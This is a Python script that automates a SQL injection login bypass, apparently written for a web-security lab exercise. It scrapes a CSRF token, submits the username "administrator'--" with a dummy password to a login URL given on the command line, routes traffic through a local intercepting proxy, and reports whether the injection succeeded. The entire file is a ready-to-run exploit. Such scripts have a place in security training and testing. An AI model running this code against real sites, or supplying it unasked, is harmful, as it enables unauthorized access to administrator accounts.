import requests
import urllib3
import sys
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}


def get_csrf_token(s, url):
    # csfr needed in the POST request body
    r = s.get(url, verify=False, proxies=proxies)

    # BeatifulSoup needed to find the csfr token in the response
    soup = BeautifulSoup(r.text, 'html.parser')

    # It takes the first input element in the response
    csfr = soup.find("input")['value']
    return csfr


def exploit_sqli(s, url):

    csrf = get_csrf_token(s, url)
    username = "administrator'--"
    password = "dd"
    myData = {
        "csrf":csrf,
        "username":username,
        "password":password
    }
    r = s.post(url, data=myData, verify=False, proxies=proxies)
    if "administrator" in r.text:
        return True
    else:
        return False


if __name__ == '__main__':
    url = sys.argv[1]
    
    # Session is needed because we do 2 requests: GET and POST
    s = requests.Session()
    if exploit_sqli(s, url):
        print("(+) SQL injection successed")
    else:
        print("(-) SQL injection failed")